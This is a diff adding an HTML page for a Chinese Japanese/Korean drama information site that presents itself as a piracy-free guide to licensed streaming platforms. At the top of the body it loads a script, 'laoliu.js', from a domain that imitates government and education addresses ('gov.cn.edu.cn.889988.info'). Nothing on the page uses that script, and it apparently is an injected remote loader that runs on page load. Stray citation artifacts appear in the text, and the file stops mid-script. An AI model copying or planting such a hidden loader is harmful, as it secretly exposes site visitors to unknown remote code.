@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>日韩影视 - 樱雾灰粉正版日剧韩剧资讯导航馆·题材分面/正版平台/字幕画质 | rihanavyingshi-h5.github.io</title>
+<meta name="description" content="日韩影视（https://rihanavyingshi-h5.github.io）单页资讯演示：日剧韩剧片单、题材分面、正版平台指引、防盗版防坑、字幕画质建议、影评与无障碍站规。站名仅为命名示例，不提供未授权播放源。">
+<meta name="keywords" content="日韩影视,日剧资讯,韩剧资讯,正版平台,爱奇艺,腾讯视频,优酷,芒果TV,B站,央视频,字幕画质,防盗版,rihanavyingshi-h5.github.io">
+<meta name="robots" content="index,follow">
+<meta name="theme-color" content="#27323f">
+<meta property="og:title" content="日韩影视 - 樱雾灰粉正版日剧韩剧资讯馆">
+<meta property="og:description" content="日剧韩剧片单、题材分面、正版防坑、字幕画质、影评与无障碍站规；站名仅为命名示例。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://rihanavyingshi-h5.github.io">
+<link rel="canonical" href="https://rihanavyingshi-h5.github.io">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --ink:#27323f;--ink2:#6b7785;--paper:#f7f4f6;--cream:#ffffff;
+  --sakura:#e7b7c8;--sakura2:#f3d9e2;--blue:#3a5b78;--blue2:#6f9bbf;
+  --line:rgba(231,183,200,.35);--shadow:0 16px 32px rgba(39,50,63,.12);
+}
+html{scroll-behavior:smooth}
+body.big-text{font-size:18px}
+body.reduce-motion *{animation:none!important;transition:none!important;scroll-behavior:auto!important}
+body.high-contrast{filter:contrast(1.18)}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:linear-gradient(160deg,#f7f4f6,#eef1f4);color:var(--ink);line-height:1.75;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.06;background-image:radial-gradient(circle at 15% 20%,var(--sakura) 0,transparent 35%),radial-gradient(circle at 85% 80%,var(--blue2) 0,transparent 35%)}
+.wrap{max-width:1200px;margin:0 auto;padding:0 16px;position:relative;z-index:1}
+a{color:inherit;text-decoration:none}
+
+.notice{background:var(--ink);color:#f3d9e2;font-size:.74rem;text-align:center;padding:7px 12px}
+.notice b{color:var(--sakura)}
+
+.site-header{position:sticky;top:0;z-index:60;background:linear-gradient(135deg,var(--sakura),var(--blue));border-bottom:3px solid var(--sakura2)}
+.nav{display:flex;align-items:center;justify-content:space-between;min-height:62px;gap:10px;flex-wrap:wrap}
+.brand{display:flex;align-items:center;gap:10px;font-weight:900;font-size:1.15rem;color:#fff}
+.logo{width:34px;height:34px;border-radius:50%;background:linear-gradient(135deg,#fff,var(--sakura2));color:var(--ink);display:grid;place-items:center;font-weight:900;font-size:.8rem}
+.brand b{color:var(--sakura2)}
+.searchbar{display:flex;gap:8px;flex:1;min-width:160px;max-width:340px}
+.searchbar input{flex:1;padding:9px 14px;border-radius:22px;border:1px solid var(--line);background:#fff;color:var(--ink);font-size:.88rem}
+.searchbar button{padding:9px 18px;border:0;border-radius:22px;background:var(--blue);color:#fff;font-weight:800;cursor:pointer;min-height:42px}
+.burger{display:none;flex-direction:column;gap:5px;cursor:pointer}
+.burger span{width:24px;height:3px;background:#fff;border-radius:3px}
+.navlinks{display:flex;gap:6px;flex-wrap:wrap}
+.navlinks a{padding:8px 13px;border-radius:20px;font-size:.8rem;font-weight:700;color:#f3d9e2;min-height:40px;display:inline-flex;align-items:center}
+.navlinks a:hover,.navlinks a.active{background:#fff;color:var(--ink)}
+
+.hero{padding:30px 0 18px}
+.hero-grid{display:grid;grid-template-columns:1.1fr .9fr;gap:26px;align-items:center}
+.hero h1{font-size:clamp(1.9rem,4.6vw,2.8rem);font-weight:900;line-height:1.12}
+.hero h1 em{font-style:normal;color:var(--blue)}
+.hero h1 .pet{display:inline-block;transform:rotate(8deg)}
+.disclaim{font-size:.74rem;background:#fff;border-left:4px solid var(--sakura);color:var(--ink);padding:10px 14px;border-radius:0 12px 12px 0;margin:14px 0;line-height:1.7}
+.disclaim b{color:var(--blue)}
+.hero p{color:var(--ink2);max-width:520px}
+.cta{display:flex;gap:12px;flex-wrap:wrap;margin-top:16px}
+.btn{padding:11px 22px;border-radius:24px;font-weight:800;font-size:.9rem;cursor:pointer;border:0;transition:.25s;min-height:44px;display:inline-flex;align-items:center}
+.btn-sig{background:linear-gradient(135deg,var(--sakura),var(--blue));color:#fff}
+.btn-sig:hover{transform:translateY(-3px)}
+.btn-out{background:transparent;border:2px solid var(--blue);color:var(--blue)}
+.btn-out:hover{background:var(--blue);color:#fff}
+.chips{display:flex;gap:7px;flex-wrap:wrap;margin-top:14px}
+.chip{font-size:.72rem;font-weight:800;padding:5px 12px;border-radius:999px;background:var(--sakura2);color:var(--ink);border:1px solid var(--line)}
+.chip.hot{background:var(--blue);color:#fff;border-color:transparent}
+.hero-card{background:#fff;border:1px solid var(--line);border-radius:18px;padding:18px;box-shadow:var(--shadow);text-align:center}
+.hero-card .blossom{height:96px;border-radius:14px;background:linear-gradient(135deg,var(--sakura),var(--blue));display:grid;place-items:center;font-size:2.2rem;color:#fff;margin-bottom:12px}
+.hero-card small{font-size:.74rem;color:var(--ink2)}
+
+section.block{scroll-margin-top:80px;padding:34px 0}
+.sec-head{display:flex;align-items:center;gap:10px;margin-bottom:18px}
+.sec-head .dot{width:10px;height:24px;border-radius:99px;background:linear-gradient(var(--sakura),var(--blue))}
+.sec-head h2{font-size:1.3rem;font-weight:900}
+.sec-head .tag{margin-left:auto;font-size:.72rem;color:var(--ink2);background:#fff;border:1px solid var(--line);padding:5px 12px;border-radius:999px}
+
+.cats{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px}
+.cat{font-size:.78rem;font-weight:800;padding:8px 15px;border-radius:999px;background:#fff;border:1px solid var(--line);color:var(--ink2);cursor:pointer;min-height:40px}
+.cat.on{background:var(--blue);color:#fff;border-color:transparent}
+
+.workgrid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.wcard{background:#fff;border:1px solid var(--line);border-radius:16px;overflow:hidden;box-shadow:var(--shadow);opacity:0;transform:translateY(12px);transition:.5s}
+.wcard.in{opacity:1;transform:none}
+.wcard:hover{border-color:var(--sakura)}
+.wcard .hd{height:78px;display:grid;place-items:center;font-size:2rem;color:#fff}
+.k1{background:linear-gradient(135deg,var(--sakura),var(--ink))}
+.k2{background:linear-gradient(135deg,var(--blue2),var(--ink))}
+.k3{background:linear-gradient(135deg,#c98aa6,var(--ink))}
+.k4{background:linear-gradient(135deg,#5b86a8,var(--ink))}
+.k5{background:linear-gradient(135deg,#e0a9bd,var(--ink))}
+.k6{background:linear-gradient(135deg,#4a718f,var(--ink))}
+.wcard .bd{padding:14px}
+.wcard h4{font-size:.9rem;font-weight:800}
+.wcard p{font-size:.74rem;color:var(--ink2);margin:4px 0 10px}
+.wcard .row{display:flex;justify-content:space-between;align-items:center}
+.wcard .tg{font-size:.68rem;font-weight:800;padding:3px 10px;border-radius:999px;background:var(--sakura2);color:var(--ink);border:1px solid var(--line)}
+.wcard .go{padding:6px 13px;border-radius:20px;font-size:.72rem;font-weight:800;background:var(--ink);color:#f3d9e2}
+
+.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px}
+.tab{font-size:.78rem;font-weight:800;padding:8px 15px;border-radius:10px;background:#fff;border:1px solid var(--line);color:var(--ink2);cursor:pointer}
+.tab.on{background:var(--sakura);color:var(--ink);border-color:transparent}
+.panel{display:none}
+.panel.on{display:block}
+.genrelist{display:grid;grid-template-columns:repeat(2,1fr);gap:12px}
+.gitem{background:#fff;border:1px solid var(--line);border-radius:12px;padding:14px;box-shadow:var(--shadow);border-top:4px solid var(--blue);opacity:0;transform:translateY(10px);transition:.5s}
+.gitem.in{opacity:1;transform:none}
+.gitem h4{font-size:.86rem;font-weight:800;display:flex;align-items:center;gap:8px}
+.gitem p{font-size:.74rem;color:var(--ink2);margin-top:4px}
+.tags{margin-top:8px;display:flex;gap:5px;flex-wrap:wrap}
+.stag{font-size:.66rem;font-weight:800;padding:2px 8px;border-radius:6px;background:var(--sakura2);color:var(--ink);border:1px solid var(--line)}
+
+.timeline{background:#fff;border:1px solid var(--line);border-radius:14px;padding:20px;box-shadow:var(--shadow);position:relative}
+.timeline::before{content:'';position:absolute;left:30px;top:24px;bottom:24px;width:3px;background:linear-gradient(var(--sakura),var(--blue))}
+.tl-item{position:relative;padding:0 0 18px 56px}
+.tl-item:last-child{padding-bottom:0}
+.tl-item .dot{position:absolute;left:22px;top:2px;width:20px;height:20px;border-radius:50%;background:var(--blue);border:3px solid #fff;box-shadow:0 0 0 2px var(--sakura)}
+.tl-item h4{font-size:.88rem;font-weight:800}
+.tl-item p{font-size:.76rem;color:var(--ink2);margin-top:3px}
+.warn{margin-top:14px;background:linear-gradient(135deg,var(--ink),#1b242e);color:#f3d9e2;border-radius:12px;padding:16px}
+.warn h4{font-size:.9rem;color:var(--sakura)}
+.warn ul{list-style:none;display:grid;gap:7px;margin-top:8px}
+.warn li{font-size:.76rem;padding-left:20px;position:relative;line-height:1.6}
+.warn li::before{content:'⛔';position:absolute;left:0}
+
+.faq{max-width:920px}
+.qa{background:#fff;border:1px solid var(--line);border-radius:12px;margin-bottom:10px;box-shadow:var(--shadow);overflow:hidden}
+.qa summary{padding:14px 16px;font-size:.9rem;font-weight:800;cursor:pointer;list-style:none;display:flex;justify-content:space-between}
+.qa summary::-webkit-details-marker{display:none}
+.qa summary::after{content:'+';color:var(--blue);font-size:1.1rem}
+.qa[open] summary::after{content:'−'}
+.qa .ab{padding:0 16px 14px;font-size:.8rem;color:var(--ink2);line-height:1.7}
+.specs{display:flex;gap:6px;flex-wrap:wrap;margin-top:8px}
+.spec{font-size:.7rem;font-weight:800;padding:3px 9px;border-radius:6px;background:var(--sakura2);color:var(--ink);border:1px solid var(--line)}
+
+.review{display:grid;grid-template-columns:1fr 1.3fr;gap:16px}
+.rform{background:#fff;border:1px solid var(--line);border-radius:14px;padding:16px;box-shadow:var(--shadow)}
+.rform label{display:block;font-size:.76rem;font-weight:800;margin:8px 0 5px;color:var(--ink2)}
+.rform input,.rform textarea,.rform select{width:100%;padding:11px 12px;border-radius:9px;border:1px solid var(--line);background:#fff;color:var(--ink);font-size:.84rem;font-family:inherit}
+.rform textarea{min-height:70px;resize:vertical}
+.rform button{margin-top:10px;width:100%;padding:11px;border:0;border-radius:9px;background:linear-gradient(135deg,var(--sakura),var(--blue));color:#fff;font-weight:800;cursor:pointer;min-height:46px}
+.rlist{display:grid;gap:10px}
+.rv{background:#fff;border:1px solid var(--line);border-left:5px solid var(--sakura);border-radius:10px;padding:12px;box-shadow:var(--shadow)}
+.rv h4{font-size:.84rem;font-weight:800}
+.rv p{font-size:.74rem;color:var(--ink2);margin-top:4px}
+
+.rules{background:#fff;border:1px solid var(--line);border-radius:14px;padding:20px;box-shadow:var(--shadow)}
+.rules h3{font-size:1rem}
+.rule-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-top:12px}
+.rule{border:1px solid var(--line);border-radius:10px;padding:12px;background:var(--paper)}
+.rule b{font-size:.8rem;color:var(--blue);display:block;margin-bottom:4px}
+.rule p{font-size:.72rem;color:var(--ink2);line-height:1.6}
+.a11y{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:14px}
+.at{background:var(--sakura2);border:1px solid var(--line);border-radius:10px;padding:12px}
+.at b{font-size:.8rem;display:block;margin-bottom:6px}
+.at p{font-size:.72rem;color:var(--ink2)}
+.sw{width:46px;height:26px;border-radius:99px;background:#cbbdb3;position:relative;display:inline-block;border:0;cursor:pointer;vertical-align:middle}
+.sw i{position:absolute;top:3px;left:3px;width:20px;height:20px;border-radius:50%;background:#fff;transition:.2s}
+.sw.on{background:var(--blue)}
+.sw.on i{left:23px}
+
+footer.site-foot{margin-top:20px;background:linear-gradient(135deg,var(--ink),#1b242e);color:#cbbdb3;padding:30px 0 20px;border-top:3px solid var(--sakura)}
+.foot-brand{font-weight:900;font-size:1.1rem;text-align:center;color:#fff;margin-bottom:10px}
+.foot-brand b{color:var(--sakura)}
+.foot-links{display:flex;flex-wrap:wrap;justify-content:center;gap:14px;margin-bottom:12px}
+.foot-links a{font-size:.8rem;color:#cbbdb3;min-height:40px;display:inline-flex;align-items:center}
+.foot-links a:hover{color:#fff}
+.foot-small{text-align:center;font-size:.73rem;line-height:1.7}
+
+@media(max-width:960px){
+  .hero-grid{grid-template-columns:1fr}
+  .workgrid{grid-template-columns:repeat(2,1fr)}
+  .genrelist{grid-template-columns:1fr}
+  .review{grid-template-columns:1fr}
+  .rule-grid{grid-template-columns:1fr}
+  .a11y{grid-template-columns:1fr}
+}
+@media(max-width:680px){
+  .navlinks{position:fixed;top:96px;left:12px;right:12px;flex-direction:column;background:var(--ink);padding:12px;border-radius:14px;box-shadow:var(--shadow);transform:translateY(-200%);transition:.3s}
+  .navlinks.open{transform:none}
+  .burger{display:flex}
+  .searchbar{order:3;width:100%;max-width:none}
+  .workgrid{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="notice">「日韩影视」仅为本次命名示例，不与任何历史「韩剧TV/日剧网/字幕组资源站」关联；本页不提供播放源、不写备用域名/专用播放器/网盘。[7,10](@ref)</div>
+
+<div class="wrap">
+  <header class="site-header">
+    <div class="nav">
+      <div class="brand"><span class="logo">日</span> 日韩影视<b>·正版资讯导航</b></div>
+      <form class="searchbar" onsubmit="return false">
+        <input type="search" placeholder="搜日剧/韩剧：律政/医疗/悬疑/治愈…" aria-label="搜索影视">
+        <button type="submit">找片</button>
+      </form>
+      <nav class="navlinks" id="nav">
+        <a href="#works" class="active">片单矩阵</a>
+        <a href="#genre">日韩分面</a>
+        <a href="#legal">正版防坑</a>
+        <a href="#quality">字幕画质</a>
+        <a href="#reviews">影评短评</a>
+        <a href="#rules">站规无障碍</a>
+      </nav>
+      <div class="burger" id="burger"><span></span><span></span><span></span></div>
+    </div>
+  </header>
+
+  <main>
+    <section class="hero">
+      <div class="hero-grid">
+        <div class="hero-text">
+          <h1>樱雾冷调片单馆<br>日韩影视<span class="pet">🌸</span><em>只做资讯导航</em></h1>
+          <div class="disclaim">
+            <b>合规声明：</b>「日韩影视」及域名 rihanavyingshi-h5 仅为命名示例，<b>不与历史「韩剧TV」APP/网站案 [7,10,12](@ref)、不与任何日剧网/字幕组资源站关联</b>；本页不挂播放源、不聚合盗版、不提供备用域名/专用播放器/网盘直链/APK。
+          </div>
+          <p>日韩影视（rihanavyingshi-h5.github.io）整理日剧、韩剧、日影韩影、综艺与纪录片资讯：片单矩阵、日韩题材分面、正版平台指引、防盗版防坑、字幕画质建议、影评与无障碍站规。内链全部为 #，不提供未授权播放源，符合必应内容规范。</p>
+          <div class="cta">
+            <a href="#works" class="btn btn-sig">看片单矩阵</a>
+            <a href="#legal" class="btn btn-out">正版防坑指引</a>
+          </div>
+          <div class="chips">
+            <span class="chip hot">命名示例</span>
+            <span class="chip">不关联韩剧TV</span>
+            <span class="chip">不挂片源</span>
+            <span class="chip">防盗版</span>
+            <span class="chip">字幕画质</span>
+            <span class="chip">必应友好</span>
+          </div>
+        </div>
+        <aside class="hero-card">
+          <div class="blossom">🌸🇯🇵🇰🇷</div>
+          <small>rihanavyingshi-h5.github.io<br>静态资讯导航演示 · 不提供播放源</small>
+        </aside>
+      </div>
+    </section>
+
+    <!-- 1 片单 -->
+    <section class="block" id="works">
+      <div class="sec-head"><span class="dot"></span><h2>日剧韩剧片单 · 樱雾矩阵</h2><span class="tag">资讯向·不播放正片</span></div>
+      <div class="cats" id="cats">
+        <span class="cat on" data-c="all">全部</span>
+        <span class="cat" data-c="jp">日剧</span>
+        <span class="cat" data-c="kr">韩剧</span>
+        <span class="cat" data-c="movie">电影</span>
+        <span class="cat" data-c="show">综艺</span>
+        <span class="cat" data-c="doc">纪录片</span>
+      </div>
+      <div class="workgrid" id="worksGrid">
+        <article class="wcard" data-c="kr"><div class="hd k1">🇰🇷</div><div class="bd"><h4>韩剧·现实悬疑</h4><p>财阀、悬疑、职场复仇；正版看持牌平台独播页，认准出品方与集数。</p><div class="row"><span class="tg">韩剧·悬疑</span><span class="go">详情</span></div></div></article>
+        <article class="wcard" data-c="jp"><div class="hd k2">🇯🇵</div><div class="bd"><h4>日剧·社会职场</h4><p>医疗、律政、校园、职场；按日文原名+主演搜，避开二创剪辑。</p><div class="row"><span class="tg">日剧·现实</span><span class="go">详情</span></div></div></article>
+        <article class="wcard" data-c="kr"><div class="hd k3">💗</div><div class="bd"><h4>韩剧·治愈爱情</h4><p>慢节奏、家庭、友情；优先官方简中字幕与正版回看。</p><div class="row"><span class="tg">韩剧·治愈</span><span class="go">详情</span></div></div></article>
+        <article class="wcard" data-c="jp"><div class="hd k4">🍡</div><div class="bd"><h4>日剧·推理漫改</h4><p>社会派推理、漫画改编；看正版平台授权版本，字幕别用录屏硬字幕。</p><div class="row"><span class="tg">日剧·推理</span><span class="go">详情</span></div></article>
+        <article class="wcard" data-c="movie"><div class="hd k5">🎬</div><div class="bd"><h4>日影韩影</h4><p>现实、犯罪、动画电影；院线转网按地区授权检索。</p><div class="row"><span class="tg">电影</span><span class="go">详情</span></div></div></article>
+        <article class="wcard" data-c="show"><div class="hd k6">🎤</div><div class="bd"><h4>综艺纪实时事</h4><p>韩综、日综、NHK纪录；央视频/B站官方号更稳，不碰网盘切片。</p><div class="row"><span class="tg">综艺·纪录</span><span class="go">详情</span></div></article></article>
+      </div>
+    </section>
+
+    <!-- 2 日韩分面 tabs -->
+    <section class="block" id="genre">
+      <div class="sec-head"><span class="dot"></span><h2>日韩题材分面</h2><span class="tag">标签页·纯前端</span></div>
+      <div class="tabs" id="tabs">
+        <span class="tab on" data-t="all">综合</span>
+        <span class="tab" data-t="krcrime">韩剧悬疑</span>
+        <span class="tab" data-t="krdaily">韩剧治愈</span>
+        <span class="tab" data-t="jpsocial">日剧社会</span>
+        <span class="tab" data-t="jpmystery">日剧推理</span>
+        <span class="tab" data-t="movie">电影</span>
+        <span class="tab" data-t="show">综艺纪录</span>
+      </div>
+      <div class="panel on" data-p="all">
+        <div class="genrelist"><article class="gitem"><h4>▦ 综合资讯</h4><p>日韩影视综合片单导航，不提供播放源。</p><div class="tags"><span class="stag">资讯</span><span class="stag">导航</span></div></article></div>
+      </div>
+      <div class="panel" data-p="krcrime">
+        <div class="genrelist"><article class="gitem"><h4>🇰🇷 韩剧悬疑财阀</h4><p>复仇、商战、刑侦；重证据链与对白，正版平台看独播页。</p><div class="tags"><span class="stag">1080p</span><span class="stag">简中</span><span class="stag">官方字幕</span></div></article></div>
+      </div>
+      <div class="panel" data-p="krdaily">
+        <div class="genrelist"><article class="gitem"><h4>💗 韩剧治愈爱情</h4><p>家庭、友情、慢节奏；认准集数与出品方，避开切片号引流。</p><div class="tags"><span class="stag">正版</span><span class="stag">字幕</span><span class="stag">回看</span></div></article></div>
+      </div>
+      <div class="panel" data-p="jpsocial">
+        <div class="genrelist"><article class="gitem"><h4>🇯🇵 日剧社会职场</h4><p>医疗、律政、校园；用日文原名+主演搜更准确。</p><div class="tags"><span class="stag">日剧</span><span class="stag">原名检索</span><span class="stag">字幕</span></div></article></div>
+      </div>
+      <div class="panel" data-p="jpmystery">
+        <div class="genrelist"><article class="gitem"><h4>🕵️ 日剧推理漫改</h4><p>社会派、漫画改编；正版授权源，字幕描边更清楚。</p><div class="tags"><span class="stag">1080p</span><span class="stag">字幕描边</span><span class="stag">正版</span></div></article></div>
+      </div>
+      <div class="panel" data-p="movie">
+        <div class="genrelist"><article class="gitem"><h4>🎬 日影韩影</h4><p>现实、犯罪、动画电影；院线转网按地区授权。</p><div class="tags"><span class="stag">杜比</span><span class="stag">正版</span><span class="stag">分级</span></div></article></div>
+      </div>
+      <div class="panel" data-p="show">
+        <div class="genrelist"><article class="gitem"><h4>🎤 综艺与纪录</h4><p>韩综、NHK、B站官方号；不碰网盘全集切片。</p><div class="tags"><span class="stag">官方</span><span class="stag">正版</span><span class="stag">字幕</span></div></article></div>
+      </div>
+    </section>
+
+    <!-- 3 正版防坑 timeline -->
+    <section class="block" id="legal">
+      <div class="sec-head"><span class="dot"></span><h2>正版渠道与防盗版指引</h2><span class="tag">合规·不嵌盗版源</span></div>
+      <div class="timeline">
+        <div class="tl-item"><span class="dot"></span><h4>只去持牌平台</h4><p>爱奇艺、腾讯视频、优酷、芒果TV、B站、央视频；部分剧也可看 Netflix/Disney+ 地区授权页。[2](@ref)</p></div>
+        <div class="tl-item"><span class="dot"></span><h4>按原名+主演搜</h4><p>别只搜「日韩影视+全集」；核对出品方、集数、地区版与字幕来源，同名翻拍很多。</p></div>
+        <div class="tl-item"><span class="dot"></span><h4>不装专用播放器</h4><p>正版页用平台内置播放；要求关杀软、装APK、填手机号立刻停。[1](@ref)</p></div>
+        <div class="tl-item"><span class="dot"></span><h4>不碰网盘"全集"</h4><p>盗版常走网盘/群聊分发；未授权聚合韩剧韩综已有刑责案例。[12](@ref)</p></div>
+      </div>
+      <div class="warn">
+        <h4>日韩影视防坑提示（命名示例）</h4>
+        <ul>
+          <li>不与历史「韩剧TV」APP/网站案 [7,10](@ref)、不与任何日剧网/字幕组资源站关联；不提供未授权在线播放、备用域名、全片源。</li>
+          <li>不内置专用播放器、不引导网盘转存、不聚合第三方盗链；境外剧境内上线还需发行许可等合规要求。[4](@ref)</li>
+          <li>「免费全集/无删减/破解VIP」多是诱导弹窗或钓鱼，画质字幕也不稳。[1](@ref)</li>
+          <li>片单仅资讯演示，实际观看以持牌平台授权页为准。</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- 4 字幕画质 -->
+    <section class="block" id="quality">
+      <div class="sec-head"><span class="dot"></span><h2>字幕与画质手记</h2><span class="tag">折叠问答</span></div>
+      <div class="faq">
+        <details class="qa" open><summary>韩剧暗场夜戏怎么看清？</summary><div class="ab"><p>标准/电影模式，HDR提中间调别压死黑；字幕开高对比描边，别用录屏硬字幕。<div class="specs"><span class="spec">HDR</span><span class="spec">中间调</span><span class="spec">字幕描边</span></div></p></div></details>
+        <details class="qa"><summary>日剧对白字幕怎么选？</summary><div class="ab"><p>优先官方简中/繁中字幕；漫改推理别用机器翻译硬字幕，人名地名易错。<div class="specs"><span class="spec">官方字幕</span><span class="spec">简中</span><span class="spec">不机翻</span></div></p></div></details>
+        <details class="qa"><summary>韩综日综切片能看吗？</summary><div class="ab"><p>二创切片不是正片源；完整综艺去持牌平台或官方频道，网盘"全集"多为未授权。<div class="specs"><span class="spec">正版</span><span class="spec">官方频道</span><span class="spec">不网盘</span></div></p></div></details>
+      </div>
+    </section>
+
+    <!-- 5 影评 -->
+    <section class="block" id="reviews">
+      <div class="sec-head"><span class="dot"></span><h2>影评与短评</h2><span class="tag">前端演示·不存储</span></div>
+      <div class="review">
+        <form class="rform" id="rvForm" autocomplete="off">
+          <label for="rvName">昵称</label>
+          <input id="rvName" placeholder="如：日韩影友" required>
+          <label for="rvFilm">片名/题材</label>
+          <input id="rvFilm" placeholder="如：韩剧·现实悬疑（正版）" required>
+          <label for="rvMood">推荐星级</label>
+          <select id="rvScore"><option>▦▦▦▦▦ 必看</option><option>▦▦▦▦ 优质</option><option>▦▦▦ 可看</option><option>▦▦ 一般</option><option>▦ 不推荐</option></select>
+          <label for="rvText">短评内容</label>
+          <textarea id="rvText" placeholder="写剧情准确度、字幕画质、正版渠道建议，保持合规。"></textarea>
+          <button type="submit">提交短评</button>
+          <p style="font-size:.7rem;color:var(--ink2);margin-top:8px">仅前端演示，不传服务器；不接收盗版链接、播放器、网盘。</p>
+        </form>
+        <div class="rlist" id="rvList">
+          <article class="rv"><h4>日韩影友：韩剧悬疑</h4><p>"持牌平台按出品方搜最稳，不点聚合站弹窗；夜戏字幕开描边更清楚。"</p></article>
+          <article class="rv"><h4>周末刷剧：日剧社会</h4><p>"用日文原名搜更准，官方字幕比录屏干净；平台内置播放就够了。"</p></article>
+        </div>
+      </div>
+    </section>
+
+    <!-- 6 站规 -->
+    <section class="block" id="rules">
+      <div class="sec-head"><span class="dot"></span><h2>站规与无障碍</h2><span class="tag">单页演示</span></div>
+      <div class="rules">
+        <h3>日韩影视资讯导航馆规则（命名示例）</h3>
+        <div class="rule-grid">
+          <div class="rule"><b>1. 命名声明</b><p>「日韩影视」仅为命名示例，不与历史「韩剧TV」及任何日剧网/字幕组站关联。</p></div>
+          <div class="rule"><b>2. 内容范围</b><p>本页仅影视资讯演示，不提供播放/下载/网盘/备用域名。</p></div>
+          <div class="rule"><b>3. 正版指引</b><p>片单与分面为前端示例，实际以持牌平台正版授权为准。[2](@ref)</p></div>
+          <div class="rule"><b>4. 评论规范</b><p>不接收盗版链接、播放器安装包、破解VIP教程。</p></div>
+          <div class="rule"><b>5. 隐私说明</b><p>搜索与筛选仅本地前端过滤，不采集账号与支付信息。</p></div>
+          <div class="rule"><b>6. 风控红线</b><p>不写"最新地址/全片播放/专用播放器/网盘直链"。</p></div>
+        </div>
+        <div class="a11y">
+          <div class="at"><b>大字号模式</b><p><button class="sw" id="swText" role="switch" aria-checked="false" tabindex="0"><i></i></button> 正文放大到 18px</p></div>
+          <div class="at"><b>减弱动效</b><p><button class="sw" id="swMotion" role="switch" aria-checked="false" tabindex="0"><i></i></button> 关闭过渡动画</p></div>
+          <div class="at"><b>高对比度</b><p><button class="sw" id="swContrast" role="switch" aria-checked="false" tabindex="0"><i></i></button> 提升对比度</p></div>
+        </div>
+        <p style="margin-top:16px;font-size:.74rem;color:var(--ink2);border-top:1px dashed var(--line);padding-top:12px">
+          网站名称：日韩影视 ｜ 网址：<a href="https://rihanavyingshi-h5.github.io" style="color:var(--blue)">https://rihanavyingshi-h5.github.io</a> ｜ 不提供未授权播放源。
+        </p>
+      </div>
+    </section>
+  </main>
+
+  <footer class="site-foot">
+    <div class="foot-brand">日韩影视<b>·正版资讯导航馆</b></div>
+    <div class="foot-links">
+      <a href="#works">片单矩阵</a>
+      <a href="#genre">日韩分面</a>
+      <a href="#legal">正版防坑</a>
+      <a href="#quality">字幕画质</a>
+      <a href="#reviews">影评短评</a>
+      <a href="#rules">站规无障碍</a>
+    </div>
+    <div class="foot-small">
+      © 2024 日韩影视 资讯导航馆（命名示例） ｜ rihanavyingshi-h5.github.io<br>
+      本页不提供播放源、不聚合盗版；站名仅为命名示例，不与历史「韩剧TV」等站点关联。[7,10](@ref)
+    </div>
+  </footer>
+</div>
+
+<script>
+const burger=document.getElementById('burger'),nav=document.getElementById('
